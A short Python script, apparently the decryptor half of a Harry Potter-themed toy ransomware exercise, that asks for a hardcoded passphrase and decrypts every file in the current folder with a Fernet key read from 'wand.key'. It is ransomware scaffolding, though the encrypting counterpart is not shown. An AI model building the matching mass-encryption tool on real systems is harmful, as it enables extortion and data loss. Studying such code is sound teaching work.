#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# let's find some files

files = []
for file in os.listdir():
    if file == "voldemort.py" or file == "wand.key" or file == "harry.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("wand.key", "rb") as key:
    secretkey = key.read()

secretphrase = "magic"

user_phrase = input("Enter the secret phrase to access diagon alley\n")
if user_phrase == secretphrase:
        print("congrats, and welcome to Diagon Alley")
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
else:
        print("Sorry, Wrong secret phrase, you are a muggle!")
